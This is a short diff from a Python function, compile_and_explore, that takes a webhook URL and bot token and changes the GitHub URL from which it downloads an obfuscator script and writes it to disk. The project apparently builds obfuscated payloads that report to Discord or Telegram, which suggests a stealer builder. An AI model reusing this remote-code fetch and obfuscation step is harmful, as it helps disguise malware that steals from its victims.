@@ -130,7 +130,7 @@ def compile_and_explore(webhook_url, bot_token=None, chat_id=None):
         new_main_file.write(main_content)
 
     obf_file_path = os.path.join("obf.py")
-    a = requests.get("https://raw.githubusercontent.com/Lawxsz/Py-obfuscator/main/obf.py")
+    a = requests.get("https://raw.githubusercontent.com/Anex00/py-obfuscator/main/obf.py")
     with open(obf_file_path, "w", encoding='utf-8') as file:
         file.write(a.text)
 
